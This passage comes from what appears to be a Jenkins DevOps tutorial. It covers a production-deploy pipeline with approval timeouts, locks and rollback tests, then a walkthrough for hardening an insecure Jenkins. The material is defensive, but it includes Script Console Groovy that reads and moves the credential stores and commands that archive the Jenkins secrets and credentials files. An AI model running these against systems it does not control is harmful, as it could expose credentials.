          echo "  now: ${day} ${now.hour}:00 IST → ${inWindow ? '✅ inside' : '⛔ OUTSIDE'} the window"

          if (!inWindow && !params.GATE_OVERRIDE) {
            notifySlack(text: "⛔ production deploy refused — outside the window (${day} ${now.hour}:00 IST)",
                        color: 'warning')
            error("⛔ outside the deployment window. Use GATE_OVERRIDE with a reason for an emergency.")
          }
          if (params.GATE_OVERRIDE) {
            if ((params.GATE_OVERRIDE_REASON?.trim()?.length() ?: 0) < 20) {
              error('⛔ GATE_OVERRIDE requires GATE_OVERRIDE_REASON of at least 20 characters')
            }
            echo "⚠️  GATE OVERRIDDEN by ${env.BUILD_CAUSE ?: 'a manual run'}: ${params.GATE_OVERRIDE_REASON}"
            notifySlack(text: "🚨 the production gate was OVERRIDDEN — ${params.GATE_OVERRIDE_REASON}",
                        color: 'warning')
            writeFile file: 'gate-override.jsonl', text: groovy.json.JsonOutput.toJson([
              ts: java.time.Instant.now().toString(), build: env.BUILD_URL,
              by: currentBuild.getBuildCauses('UserIdCause')*.userId.join(',') ?: 'unknown',
              reason: params.GATE_OVERRIDE_REASON, violations: 'outside-window'
            ]) + '\n'
            archiveArtifacts 'gate-override.jsonl'
          }

          // ⭐ the SLO / alert / recent-deploy gate (the script from the Azure case)
          productionGate(environment: 'production', allowOverride: params.GATE_OVERRIDE)
        }
      }
    }

    // ══════════════════════════════════════════════════════════
    stage('3 · 🙋 Approve') {
      steps {
        script {
          def outcome = null
          // ⭐⭐ THE TIMEOUT — 8 hours, and it FAILS SAFELY
          timeout(time: 8, unit: 'HOURS') {
            try {
              outcome = input(
                id: 'prod-approval',
                message: """
🚀 PRODUCTION DEPLOYMENT

  Revision:   ${env.REV.take(7)}
  Strategy:   ${params.STRATEGY}
  Ticket:     ${params.CHANGE_TICKET ?: '(to be entered)'}
  Build:      ${env.BUILD_URL}
  Gate:       ${params.GATE_OVERRIDE ? '⚠️ OVERRIDDEN' : '✅ passed'}

  ──────────────────────────────────────────────
  CHECKLIST
    ☐ the staging smoke test passed for THIS revision
    ☐ the diff touches only the expected paths
    ☐ a change ticket exists and is linked
    ☐ no SLO is burning (Grafana → shop SLOs)
    ☐ no critical alert is firing (#shop-oncall)
    ☐ it is not Friday after 16:00 IST
    ☐ you know how to roll back: helm rollback shop -n shop
  ──────────────────────────────────────────────
""",
                ok: '✅ Approve and deploy to production',
                submitter: 'sre-team',              // ⭐⭐ a GROUP from the security realm
                submitterParameter: 'APPROVER',
                canCancel: true,
                parameters: [
                  string(name: 'TICKET', defaultValue: params.CHANGE_TICKET,
                         description: '⭐ The change ticket ID (CHG-12345)'),
                  text(name: 'NOTES', defaultValue: '', description: 'Anything the next person should know'),
                ]
              )
              env.APPROVER = outcome.APPROVER ?: outcome.toString()
              env.TICKET   = outcome.TICKET ?: params.CHANGE_TICKET
              env.NOTES    = outcome.NOTES ?: ''

              // ⭐⭐ VALIDATE what the approver typed
              if (!env.TICKET?.trim()) { error('⛔ a change ticket ID is required') }
              if (!(env.TICKET ==~ /^(CHG|SRE|INC)-\d{4,}$/)) {
                error("⛔ '${env.TICKET}' is not a valid ticket ID (expected CHG-12345)")
              }
              echo "  ✅ approved by ${env.APPROVER} against ${env.TICKET}"
              currentBuild.description = "✅ ${env.APPROVER} · ${env.TICKET} · ${env.REV.take(7)}"
              currentBuild.displayName += " · ✅ ${env.APPROVER}"

            } catch (org.jenkinsci.plugins.workflow.steps.FlowInterruptedException e) {
              // ⭐⭐⭐ THE CRITICAL PART — a timeout or a reject lands HERE
              def causes = e.causes*.shortDescription.join(', ')
              echo "⛔ the approval did not complete: ${causes}"
              currentBuild.description = "⛔ ${causes}"
              def isTimeout = causes.toLowerCase().contains('timeout') ||
                              e.getCause()?.message?.toLowerCase()?.contains('timeout')
              def isReject  = causes.toLowerCase().contains('reject') ||
                              causes.toLowerCase().contains('abort')
              if (isTimeout) {
                notifySlack(text: "⏰ the production approval TIMED OUT after 8h — nothing was deployed",
                            color: 'warning')
                // ⭐⭐ a timeout is NOT a failure of the code — mark it ABORTED, not FAILURE,
                //    so the failure-rate metric isn't polluted
                currentBuild.result = 'ABORTED'
              } else if (isReject) {
                notifySlack(text: "🚫 the production deploy was REJECTED", color: 'danger')
                currentBuild.result = 'ABORTED'
              } else {
                notifySlack(text: "⛔ the approval step ended unexpectedly: ${causes}", color: 'danger')
                currentBuild.result = 'FAILURE'
              }
              // ⭐⭐ AND STOP. Never fall through to the deploy stage.
              error("the production deploy was not approved (${causes})")
            }
          }
        }
      }
    }

    // ══════════════════════════════════════════════════════════
    stage('4 · 🔒 Deploy') {
      steps {
        // ⭐⭐ THE MUTEX — two locks, acquired atomically
        lock(resource: 'deploy-production',
             extra: [[resource: 'shop-database-migration']],
             inversePrecedence: true,
             variable: 'LOCKED') {
          script {
            echo "  🔒 holding: ${env.LOCKED}"
            // ⭐ a milestone here means: if a NEWER build reached this point while
            //    we were waiting for the lock, THIS one is aborted.
            milestone()
            deployTo(environment: 'production', revision: env.REV, dryRun: params.DRY_RUN)
            env.DEPLOYED = 'true'
          }
        }
      }
      post {
        failure {
          script {
            // ⭐ the automatic rollback (deployTo also does this; belt and braces)
            if (env.DEPLOYED != 'true') {
              echo '⛔ the deploy failed — rolling back'
              sh 'helm rollback shop -n shop --wait --timeout 5m || true'
            }
          }
        }
      }
    }

    // ══════════════════════════════════════════════════════════
    stage('5 · ✅ Verify and record') {
      steps {
        script {
          // ⭐ the deployed revision MUST match
          def actual = sh(returnStdout: true, script: """
            kubectl -n shop get deploy shop-api \\
              -o jsonpath='{.metadata.annotations.deployed-revision}'
          """).trim()
          echo "  expected ${env.REV.take(7)}, the cluster reports ${actual.take(7)}"
          if (actual != env.REV) {
            error("⛔ the cluster is running ${actual.take(7)}, not ${env.REV.take(7)}")
          }
          // ⭐ move the production tag
          withCredentials([usernamePassword(credentialsId: 'github-bot',
                                            usernameVariable: 'GU', passwordVariable: 'GT')]) {
            sh '''
              set -euo pipefail
              git config user.name  "$GU"
              git config user.email "shop-ci@shop.example.com"
              git remote set-url origin "https://${GU}:${GT}@github.com/3558Bhk/shop.git"
              git tag -f "prod-$(date -u +%F)" "$REV"
              git push -f origin "prod-$(date -u +%F)"
            '''
          }
          // ⭐ the deploy record
          writeFile file: 'deploy-record.json', text: groovy.json.JsonOutput.prettyPrint(
            groovy.json.JsonOutput.toJson([
              environment: 'production', revision: env.REV, strategy: params.STRATEGY,
              buildNumber: env.BUILD_NUMBER.toInteger(), buildUrl: env.BUILD_URL,
              approver: env.APPROVER, ticket: env.TICKET, notes: env.NOTES,
              gateOverridden: params.GATE_OVERRIDE,
              deployedAt: java.time.Instant.now().toString(),
              jenkinsVersion: sh(returnStdout: true, script: 'curl -sf -I "$JENKINS_URL" | grep -i X-Jenkins: | cut -d" " -f2').trim()
            ]))
          archiveArtifacts 'deploy-record.json'
        }
      }
    }
  }

  post {
    success { notifySlack(text: "🚀 production is at ${env.REV?.take(7)} — approved by ${env.APPROVER}, ticket ${env.TICKET}", color: 'good') }
    failure { notifySlack(text: "⛔ the production deploy FAILED — ${env.BUILD_URL}console", color: 'danger') }
    aborted { notifySlack(text: "🚫 the production deploy was aborted (an approval timed out or was rejected)", color: 'warning') }
    always  { cleanWs(deleteDirs: true, notFailBuild: true) }
  }
}
```

**The proof — exercise every path ⭐**

```bash
J="$JENKINS_URL/job/shop/job/production/job/deploy"
trigger() { curl -s -XPOST -u admin:$TOKEN \
  "$J/buildWithParameters?REVISION=$1&STRATEGY=${2:-canary}&GATE_OVERRIDE=${3:-false}&GATE_OVERRIDE_REASON=${4:-}"; }
waitfor() { for i in $(seq 1 120); do
  s=$(curl -s -u admin:$TOKEN "$J/$1/api/json?tree=result,building" | jq -r '.result // "RUNNING"')
  [[ "$s" != "RUNNING" && "$s" != "null" ]] && { echo "$s"; return; }; sleep 5; done; echo TIMEOUT; }
nextbuild() { curl -s -u admin:$TOKEN "$J/api/json?tree=nextBuildNumber" | jq .nextBuildNumber; }

echo "═══ PATH 1: the happy path ═══"
B=$(nextbuild); trigger "$(git rev-parse origin/main)" canary
# wait for the input to appear
sleep 60
curl -s -u admin:$TOKEN "$J/$B/wfapi/pendingInputActions" | jq '.[0] | {id, message, submitter}'
curl -s -XPOST -u admin:$TOKEN "$J/$B/input/prod-approval/submit" \
  --data-urlencode 'json={"parameter":[{"name":"TICKET","value":"CHG-12345"},{"name":"NOTES","value":"planned release"}]}'
waitfor $B            # → SUCCESS
curl -s -u admin:$TOKEN "$J/$B/artifact/deploy-record.json" | jq '{approver, ticket, strategy}'
# {"approver":"harish","ticket":"CHG-12345","strategy":"canary"}        ✅

echo; echo "═══ PATH 2: an invalid ticket is rejected ═══"
B=$(nextbuild); trigger "$(git rev-parse origin/main)" canary
sleep 60
curl -s -XPOST -u admin:$TOKEN "$J/$B/input/prod-approval/submit" \
  --data-urlencode 'json={"parameter":[{"name":"TICKET","value":"lol"}]}'
waitfor $B            # → FAILURE
curl -s -u admin:$TOKEN "$J/$B/consoleText" | grep -A2 'not a valid ticket ID'
#   ⛔ 'lol' is not a valid ticket ID (expected CHG-12345)             ✅

echo; echo "═══ PATH 3: an explicit REJECT ═══"
B=$(nextbuild); trigger "$(git rev-parse origin/main)" canary
sleep 60
curl -s -XPOST -u admin:$TOKEN "$J/$B/input/prod-approval/abort"
waitfor $B            # → ABORTED (NOT FAILURE — the metric stays clean)
curl -s -u admin:$TOKEN "$J/$B/api/json?tree=result,description" | jq
# {"result":"ABORTED","description":"⛔ Rejected by harish"}            ✅

echo; echo "═══ PATH 4: ⭐⭐ THE TIMEOUT FAILS SAFELY ═══"
# temporarily set the input timeout to 2 minutes for the drill
B=$(nextbuild); trigger "$(git rev-parse origin/main)" canary
echo "  waiting 3 minutes WITHOUT approving…"
sleep 180
waitfor $B            # → ABORTED
curl -s -u admin:$TOKEN "$J/$B/consoleText" | grep -E 'TIMED OUT|was not approved'
#   ⛔ the approval did not complete: Timeout has been exceeded
#   ⏰ the production approval TIMED OUT after 8h — nothing was deployed
#   ERROR: the production deploy was not approved (Timeout has been exceeded)
# ⭐⭐ THE CRITICAL ASSERTION:
curl -s -u admin:$TOKEN "$J/$B/consoleText" | grep -c 'helm upgrade'
#   0        ⛔✅ ZERO — the deploy stage NEVER RAN. A silent timeout would show >0.

echo; echo "═══ PATH 5: the mutex — two deploys cannot overlap ═══"
B1=$(nextbuild); trigger "$(git rev-parse origin/main)" canary
sleep 60; curl -s -XPOST -u admin:$TOKEN "$J/$B1/input/prod-approval/submit" \
  --data-urlencode 'json={"parameter":[{"name":"TICKET","value":"CHG-11111"}]}'
B2=$((B1+1)); trigger "$(git rev-parse origin/main)~1" rolling
sleep 60; curl -s -XPOST -u admin:$TOKEN "$J/$B2/input/prod-approval/submit" \
  --data-urlencode 'json={"parameter":[{"name":"TICKET","value":"CHG-22222"}]}'
# ⭐ watch the lock page while they run
curl -s -u admin:$TOKEN "$JENKINS_URL/lockable-resources/api/json" \
  | jq '.resources[] | select(.name=="deploy-production") | {name, lockedBy, buildName}'
# {"name":"deploy-production","lockedBy":"…/48/","buildName":"#48"}
# ⭐ and B2's console shows:
curl -s -u admin:$TOKEN "$J/$B2/consoleText" | grep -i 'waiting for resource'
#   "deploy-production is locked by shop/production/deploy #48 — waiting"   ✅
# ⭐ disableConcurrentBuilds() queues B2 at the JOB level too, so the lock is
#    the second line of defense (it also protects against OTHER jobs that
#    lock the same resource).

echo; echo "═══ PATH 6: the window gate refuses ═══"
faketime '2026-09-11 18:30:00' bash -c "
  B=\$(curl -s -u admin:\$TOKEN \"\$J/api/json?tree=nextBuildNumber\" | jq .nextBuildNumber)
  curl -s -XPOST -u admin:\$TOKEN \"\$J/buildWithParameters?REVISION=\$(git rev-parse origin/main)&STRATEGY=canary\"
  sleep 30
  curl -s -u admin:\$TOKEN \"\$J/\$B/consoleText\" | grep -E 'OUTSIDE|refused'"
#   now: FRIDAY 18:00 IST → ⛔ OUTSIDE the window
#   ⛔ outside the deployment window. Use GATE_OVERRIDE with a reason…       ✅
# ⭐ and note: NO approval was requested. The gate runs BEFORE `input`, so
#    an SRE is never woken up to approve something that will be refused.

echo; echo "═══ PATH 7: the override needs a real reason ═══"
B=$(nextbuild); curl -s -XPOST -u admin:$TOKEN \
  "$J/buildWithParameters?REVISION=$(git rev-parse origin/main)&STRATEGY=canary&GATE_OVERRIDE=true&GATE_OVERRIDE_REASON=yolo"
sleep 30; curl -s -u admin:$TOKEN "$J/$B/consoleText" | grep 'at least 20 characters'
#   ⛔ GATE_OVERRIDE requires GATE_OVERRIDE_REASON of at least 20 characters  ✅
B=$(nextbuild); trigger "$(git rev-parse origin/main)" canary true "SEV-1 in progress; this deploy contains the fix for the payment timeout"
sleep 30
curl -s -u admin:$TOKEN "$J/$B/consoleText" | grep -E 'OVERRIDDEN'
curl -s -u admin:$TOKEN "$J/$B/artifact/gate-override.jsonl" | jq
#   {"ts":"2026-09-10T15:22:01Z","by":"harish","reason":"SEV-1 in progress; …"}  ✅
#   …and #shop-oncall got a 🚨 message

echo; echo "═══ PATH 8: ⭐ THE ROLLBACK DRILL ═══"
cat > scripts/rollback-drill.sh <<'SH'
#!/usr/bin/env bash
set -uo pipefail
T0=$(date +%s%N); mark(){ printf '  T+%-6.1fs  %s\n' "$(echo "scale=1;($(date +%s%N)-$T0)/1e9"|bc)" "$*"; }
mark "the current state"
BEFORE=$(kubectl -n shop get deploy shop-api -o jsonpath='{.spec.template.spec.containers[0].image}')
REV=$(helm history shop -n shop -o json | jq -r '.[-1].revision'); echo "     revision $REV, image ${BEFORE:0:60}"
mark "⛔ injecting a bad image"
kubectl -n shop set image deploy/shop-api api=ghcr.io/3558bhk/shop-api:does-not-exist
kubectl -n shop rollout status deploy/shop-api --timeout=45s 2>&1 | tail -2 || true
mark "broken:"; kubectl -n shop get pods -l app=shop-api --no-headers | head -2
mark "🔵 helm rollback"
T1=$(date +%s%N); helm rollback shop "$REV" -n shop --wait --timeout 5m
echo "     ✅ took $(echo "scale=1;($(date +%s%N)-$T1)/1e9"|bc)s"
mark "verifying"
AFTER=$(kubectl -n shop get deploy shop-api -o jsonpath='{.spec.template.spec.containers[0].image}')
[[ "$AFTER" == "$BEFORE" ]] && echo "     ✅ the image matches" || echo "     ⛔ MISMATCH"
./scripts/smoke-test.sh "http://$(kubectl -n shop get svc shop-api -o jsonpath='{.spec.clusterIP}')" && echo "     ✅ the smoke test passed"
echo "{\"ts\":\"$(date -u +%FT%TZ)\",\"helmRollbackS\":$(echo "scale=1;($(date +%s%N)-$T1)/1e9"|bc),\"totalS\":$(echo "scale=1;($(date +%s%N)-$T0)/1e9"|bc)}" >> rollback-drills.jsonl
SH
chmod +x scripts/rollback-drill.sh && ./scripts/rollback-drill.sh
#   T+0.0s    the current state …  T+48.1s  broken …
#   T+48.4s   🔵 helm rollback → ✅ took 31.6s
#   T+81.2s   ✅ the image matches · ✅ the smoke test passed
```

> 🔑 **The answer to say out loud:** *"Five mechanisms, and the one that matters most is the timeout handling. Jenkins' `input` step throws a `FlowInterruptedException` on both timeout and rejection — if you don't catch it explicitly, the build can fall through to the deploy stage with `env.APPROVER` unset and deploy unapproved. So the catch block distinguishes the cause, sets `currentBuild.result` to ABORTED for a timeout or reject (not FAILURE, so the failure-rate metric isn't polluted by human slowness), notifies Slack, and then calls `error()` to stop. Path 4 of the proof asserts `grep -c 'helm upgrade'` on the timed-out build's console returns **zero** — that's the whole test. Second, the gate runs before `input`, with `when { beforeAgent true }` so it doesn't even allocate a pod, because asking an SRE to approve something that will be refused for being Friday evening wastes the scarcest resource in the whole system. Third, two mutexes: `disableConcurrentBuilds()` queues at the job level, and `lock(resource:'deploy-production', extra:[[resource:'shop-database-migration']])` acquires both locks atomically so a migration and a deploy can never interleave — plus `milestone()` inside the lock so a newer build that got there first aborts the older one. Fourth, the approver's free-text input is validated against a ticket-ID regex, because an approval with no traceable change ticket is an approval that can't be audited. Fifth, the override path exists with a mandatory 20-character reason, an immediate Slack 🚨, and a JSONL artifact — gates that can't be overridden in an emergency get bypassed illegitimately."*

---

### Task 3.4 — Harden a Jenkins that was set up by clicking through the UI

**Scenario:** you inherit a Jenkins with 40 freestyle jobs, 300 plugins, the default security settings, and a build that mounts `/var/run/docker.sock`. **Find every problem, fix them in the right order, and don't break anything.**

**✅ Answer**

**Step 1 — assess before touching anything ⭐**

```bash
# ⭐ 1. TAKE A BACKUP FIRST. Everything else is recoverable only if this works.
kubectl -n jenkins exec sts/jenkins -c jenkins -- tar czf /tmp/pre-hardening.tgz \
  /var/jenkins_home/secrets /var/jenkins_home/config.xml \
  /var/jenkins_home/credentials.xml /var/jenkins_home/jobs/*/config.xml 2>/dev/null
kubectl -n jenkins cp jenkins-0:/tmp/pre-hardening.tgz ./pre-hardening.tgz
ls -la pre-hardening.tgz

# ⭐ 2. run the full audit script (§7.5) and SAVE the output as the baseline
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/scriptText" \
  --data-urlencode 'script@audit.groovy' > audit-before.txt
cat audit-before.txt
```

```
=== SECURITY AUDIT — 2026-09-10 ===

1. the built-in node executors (MUST be 0)
   numExecutors = 2  ⛔⛔⛔ FIX THIS NOW
   mode = NORMAL

2. the authorization strategy
   hudson.security.FullControlOnceLoggedInAuthorizationStrategy
   ⛔ "Logged-in users can do anything"

3. the security realm
   hudson.security.HudsonPrivateSecurityRealm
   allowsSignup = true  ⛔⛔⛔ open signup!

4. CSRF
   ⛔ DISABLED

5. Agent → Controller Access Control
   ⛔ not enabled

6. plugins needing an update
   ⚠️  credentials 2.6.1 → 3.0.0
   ⚠️  git 5.2.0 → 5.7.0
   … 47 more …

7. ⛔ deprecated/insecure plugins still installed
   ⛔ subversion 2.17 (deprecated)
   ⛔ translate 1.2 (deprecated)
   ⛔ maven-plugin 3.24 (legacy)

8. jobs running as SYSTEM (should be none)
   ⛔ shop-build  → runs as SYSTEM
   ⛔ nightly-e2e → runs as SYSTEM
   … all 40 …

10. credentials inventory
     store: SystemCredentialsProvider
       ghcr-token                     StringCredentialsImpl        GLOBAL   ⛔ should be folder-scoped
       production-kubeconfig          FileCredentialsImpl          GLOBAL   ⛔⛔⛔ CRITICAL
       aws-access-key                 AmazonWebServicesCredentials GLOBAL   ⛔⛔⛔ a LONG-LIVED KEY
       smtp                           UsernamePasswordCredentials  GLOBAL
       … 23 total, ALL in GLOBAL scope …
```

```bash
# ⭐ 3. inventory what exists, so you can prove nothing is lost
curl -s -u admin:$TOKEN "$JENKINS_URL/api/json?depth=2&tree=jobs[fullName,_class,color]" \
  | jq -r '.jobs[].jobs[]?.fullName // empty' | sort > jobs-before.txt
ssh -p 50000 admin@jenkins list-plugins | sort > plugins-before.txt
curl -s -u admin:$TOKEN "$JENKINS_URL/credentials/store/system/domain/_/api/json?tree=credentials[id,typeName,scope]" \
  | jq -r '.credentials[] | "\(.id)\t\(.typeName)\t\(.scope)"' | sort > creds-before.txt
# ⭐ and every job's config.xml — the thing you'll convert to DSL
mkdir -p job-configs-before
while read j; do
  path="${j//\//\/job\/}"
  curl -s -u admin:$TOKEN "$JENKINS_URL/job/$path/config.xml" > "job-configs-before/${j//\//_}.xml"
done < jobs-before.txt
ls job-configs-before | wc -l    # 40
wc -l jobs-before.txt plugins-before.txt creds-before.txt
```

**Step 2 — the fix order ⭐⭐ (order matters; each step is reversible)**

```
PRIORITY 1 — stop the bleeding (minutes, low risk)
  1.1 ⛔⛔⛔ the Docker socket mount
  1.2 ⭐ numExecutors: 0 on the built-in node
  1.3 ⭐ open signup OFF
  1.4 ⭐ CSRF ON

PRIORITY 2 — the authorization model (an hour, medium risk)
  2.1 the security realm → LDAP/OIDC (or at least local users, no signup)
  2.2 Role-Based authorization
  2.3 ⭐⭐ authorize-project → "run as the triggering user"
  2.4 folder-scoped credentials; production credentials into a nested folder

PRIORITY 3 — the secrets (hours, needs coordination)
  3.1 ⭐⭐ ROTATE the long-lived AWS key → OIDC or Vault
  3.2 rotate anything that was GLOBAL and readable by any job
  3.3 Agent → Controller Access Control

PRIORITY 4 — reproducibility (a day)
  4.1 ⭐⭐ JCasC — capture the config, put it in Git
  4.2 ⭐⭐ a baked image with a pinned plugins.txt
  4.3 Job DSL for the 40 freestyle jobs
  4.4 ephemeral Kubernetes pod agents; retire the static ones

PRIORITY 5 — hygiene (ongoing)
  5.1 remove the deprecated plugins
  5.2 the build discarder on every job
  5.3 job-config-history + audit-trail
  5.4 Prometheus + alerts
  5.5 the backup CronJob + a restore drill
```

**Step 3 — Priority 1, in detail**

```bash
# ── 1.1 ⛔⛔⛔ find and remove every Docker socket mount ─────────
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/scriptText" --data-urlencode 'script=
import jenkins.model.Jenkins
import org.csanchez.jenkins.plugins.kubernetes.KubernetesCloud
Jenkins.instance.clouds.findAll { it instanceof KubernetesCloud }.each { c ->
  c.templates.each { t ->
    t.volumes.each { v ->
      if (v.toString().contains("docker.sock")) {
        println "⛔⛔⛔ template ${t.name} in cloud ${c.name} mounts ${v}"
      }
    }
    t.containers.each { ct ->
      if (ct.isPrivileged()) println "⛔⛔ template ${t.name} container ${ct.name} is PRIVILEGED"
    }
  }
}'
# → ⛔⛔⛔ template docker-builder in cloud kubernetes mounts
#     HostPathVolume[hostPath=/var/run/docker.sock,mountPath=/var/run/docker.sock]

# FIX: replace that template with a Kaniko one
# ⭐ and for the freestyle jobs that use it, they need converting anyway (§3.5)
```

```groovy
// ⭐ 1.2 numExecutors: 0 — via the Script Console (then lock it in JCasC)
import jenkins.model.Jenkins
Jenkins.instance.numExecutors = 0
Jenkins.instance.mode = hudson.model.Node.Mode.EXCLUSIVE
Jenkins.instance.labelString = 'built-in'
Jenkins.instance.save()
println "  ✅ numExecutors=${Jenkins.instance.numExecutors} mode=${Jenkins.instance.mode}"

// ⛔ CHECK FIRST: is anything running on the controller right now?
Jenkins.instance.computer.executors.findAll { it.progress >= 0 }.each {
  println "  ⚠️  RUNNING ON THE CONTROLLER: ${it.currentExecutable?.fullDisplayName}"
}
// ⭐ if something IS running, wait for it. Setting executors to 0 does not kill
//    a running build — it just stops new ones being scheduled. That's the safe way.
```

```groovy
// ⭐ 1.3 + 1.4 signup and CSRF
import jenkins.model.Jenkins
import hudson.security.HudsonPrivateSecurityRealm
def j = Jenkins.instance
def realm = j.securityRealm
if (realm instanceof HudsonPrivateSecurityRealm && realm.allowsSignup) {
  // ⭐ recreate the realm with signup disabled, PRESERVING the users
  def users = realm.getAllUsers().collect { [id: it.id,
    // ⛔ you cannot read the password hashes portably — so:
    //    create the new realm, then have each user reset their password,
    //    OR migrate to LDAP/OIDC now. Do it now.
  ]}
  j.setSecurityRealm(new HudsonPrivateSecurityRealm(false, false, null))
  println "  ✅ signup disabled — existing users will need a password reset,"
  println "     or migrate to LDAP/OIDC (Priority 2.1)"
}
import hudson.security.csrf.DefaultCrumbIssuer
if (j.crumbIssuer == null) {
  j.crumbIssuer = new DefaultCrumbIssuer(true)   // ⭐ excludeClientIPFromCrumb=true
  println "  ✅ CSRF enabled"                                  //   (needed behind an LB)
}
j.save()
```

**Step 4 — Priority 2: the authorization model**

```yaml
# ⭐ captured in JCasC so it's reviewable and can't be silently reverted
jenkins:
  numExecutors: 0
  mode: EXCLUSIVE
  labelString: 'built-in'
  remotingSecurity: {enabled: true}
  crumbIssuer: {standard: {excludeClientIPFromCrumb: true}}
  securityRealm:
    ldap:                                  # ⭐ or oic for Entra/Okta
      configurations:
        - server: 'ldaps://dc.shop.example.com:636'
          rootDN: 'DC=shop,DC=example,DC=com'
          userSearchBase: 'OU=Users'
          userSearch: 'sAMAccountName={0}'
          groupSearchBase: 'OU=Groups'
          groupSearchFilter: '(&(cn={0})(objectclass=group))'
          managerDN: 'CN=jenkins-svc,OU=Service,DC=shop,DC=example,DC=com'
          managerPasswordSecret: '${LDAP_BIND_PASSWORD}'
      groupIdStrategy: 'caseInsensitive'
      userIdStrategy: 'caseInsensitive'
      disableMailAddressResolver: false
  authorizationStrategy:
    roleBased:
      roles:
        global:
          - name: 'admin'
            permissions: ['Overall/Administer']
            entries: [{user: 'harish'}, {group: 'platform-team'}]     # ⭐ ≤3 identities
          - name: 'sre'
            permissions: ['Overall/Read','Job/Read','Job/Build','Job/Configure','Job/Cancel',
                          'Job/Workspace','Run/Update','View/Read','View/Configure',
                          'Credentials/View','Agent/Connect','Agent/Disconnect']
            entries: [{group: 'sre-team'}]
          - name: 'developer'
            permissions: ['Overall/Read','Job/Read','Job/Build','Job/Cancel','Job/Workspace','View/Read']
            entries: [{group: 'developers'}]
          - name: 'auditor'
            permissions: ['Overall/Read','Job/Read','View/Read']
            entries: [{group: 'compliance'}]
        project:
          - name: 'production'
            pattern: 'shop/production/.*'
            permissions: ['Job/Read','Job/Build','Job/Configure','Job/Cancel','Credentials/Use']
            entries: [{group: 'sre-team'}]
        slave:
          - name: 'agent-admin'
            permissions: ['Agent/Configure','Agent/Connect','Agent/Disconnect','Agent/Delete']
            entries: [{group: 'platform-team'}]

unclassified:
  # ⭐⭐ 2.3 THE IDENTITY FIX
  # the authorize-project plugin's global default
  globalQueueItemAuthenticator:
    authenticators:
      - triggeringUsersAuthorizationStrategy: {}    # ⭐ run as whoever triggered it
  # ⭐ a break-glass: a specific job may run as a service user
  #   (set per-job: Job → Configure → "Run as Specific User" → shop-deployer)
```

```bash
# ⭐ 2.4 move the credentials into folder scopes
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/scriptText" --data-urlencode 'script=
import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.*
import com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProperty
import com.cloudbees.plugins.credentials.domains.Domain

def globalStore = CredentialsProvider.lookupStores(Jenkins.instance).find {
  it instanceof com.cloudbees.plugins.credentials.SystemCredentialsProvider.StoreImpl }

// ⭐ the plan: which credential belongs in which folder
def plan = [
  "production-kubeconfig": "shop/production",
  "aws-prod-role":         "shop/production",
  "pagerduty-key":         "shop/production",
  "ghcr-token":            "shop",
  "kubeconfig-staging":    "shop",
  "slack-webhook":         "shop",
  "smtp":                  null,                    // ⭐ stays GLOBAL (System scope)
]

plan.each { credId, folderName ->
  def cred = globalStore.credentials.find { it.id == credId }
  if (!cred) { println "  ⚠️  $credId not found"; return }
  if (folderName == null) { println "  ✅ $credId stays global (a System credential)"; return }
  def folder = Jenkins.instance.getItemByFullName(folderName)
  if (!folder) { println "  ⛔ the folder $folderName does not exist — create it first"; return }
  def prop = folder.getProperty(FolderCredentialsProperty)
  if (!prop) { prop = new FolderCredentialsProperty([]); folder.addProperty(prop) }
  def store = prop.store
  // ⭐ add to the folder scope, then REMOVE from global
  store.addCredentials(Domain.global(), cred)
  globalStore.removeCredentials(cred)
  println "  ✅ moved $credId → $folderName"
}
Jenkins.instance.save()
println "\n⭐ global credentials remaining:"
globalStore.credentials.each { println "     ${it.id}  (${it.scope})" }
'

# ⭐ PROVE the scoping worked
# a job in shop/ trying to use production-kubeconfig must FAIL:
#   ⛔ "ERROR: No item named production-kubeconfig found"
```

**Step 5 — Priority 3: the secrets**

```bash
# ⭐⭐ 3.1 the long-lived AWS key → OIDC (§4.6) or Vault
# The key is IN Jenkins' encrypted store. Anyone with Overall/Administer, or any
# job whose scope includes it, can read it via the Script Console. Assume it's
# compromised. Rotate it.

# 1. create the OIDC provider + role (from §4.6)
aws iam create-open-id-connect-provider --url https://jenkins.shop.example.com/oidc \
  --client-id-list sts.amazonaws.com --thumbprint-list "$(…)"
aws iam create-role --name jenkins-prod-deployer \
  --assume-role-policy-document file://trust-jenkins.json --max-session-duration 3600
aws iam put-role-policy --role-name jenkins-prod-deployer --policy-name lp \
  --policy-document file://perm-prod.json

# 2. ⭐ add the OIDC config to the Jenkinsfile; run it in PARALLEL with the old key
#    for one week so you can compare

# 3. prove the federated path works, then DELETE the IAM user's access key
aws iam list-access-keys --user-name jenkins-ci
aws iam delete-access-key --user-name jenkins-ci --access-key-id AKIA…
aws iam delete-user --user-name jenkins-ci
# 4. remove the credential from Jenkins
ssh -p 50000 admin@jenkins delete-credentials system::system::global::unrestricted aws-access-key

# ⭐ 3.3 Agent → Controller Access Control
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/scriptText" --data-urlencode 'script=
import jenkins.security.s2m.*
import jenkins.model.Jenkins
def rule = Jenkins.instance.injector.getInstance(AdminWhitelistRule)
// ⭐ start RESTRICTIVE: deny everything, then add what your agents genuinely need
rule.setMasterKillSwitch(false)                 // ⭐ false = the rules are ENFORCED
println "  ✅ Agent→Controller access control is ENFORCED"
println "     review Manage Jenkins → Security → Agents and add only what is needed"
'
# ⭐ THEN watch for a week: builds will fail with
#   "Rejected: FilePath (agent → controller) … reading /var/jenkins_home/…"
#   Each failure tells you exactly what an agent was trying to do.
#   ⭐ the common legitimate ones: reading the workspace, reading a config file.
#   ⛔ the ones you should NOT allow: reading /var/jenkins_home/secrets,
#      reading another job's workspace, writing to JENKINS_HOME.
```

**Step 6 — Priority 4: JCasC + a baked image + Job DSL**

```bash
# ⭐ 4.1 capture the CURRENT config as JCasC — the plugin can export it
curl -s -u admin:$TOKEN "$JENKINS_URL/configuration-as-code/export" > casc-captured.yaml
wc -l casc-captured.yaml           # usually 400–1200 lines
# ⭐⭐ review it line by line. The export includes things you did in the UI
#    that you forgot about — that's the point.
grep -nE 'password|secret|token|key' casc-captured.yaml
# ⭐ every one of those must become ${VAR} or ${secret:name} — NEVER inline.
# then validate:
curl -s -u admin:$TOKEN -XPOST "$JENKINS_URL/configuration-as-code/check" \
  --data-binary @casc-captured.yaml

# ⭐ 4.2 the baked image
cat > plugins-pinned.txt <<'EOF'
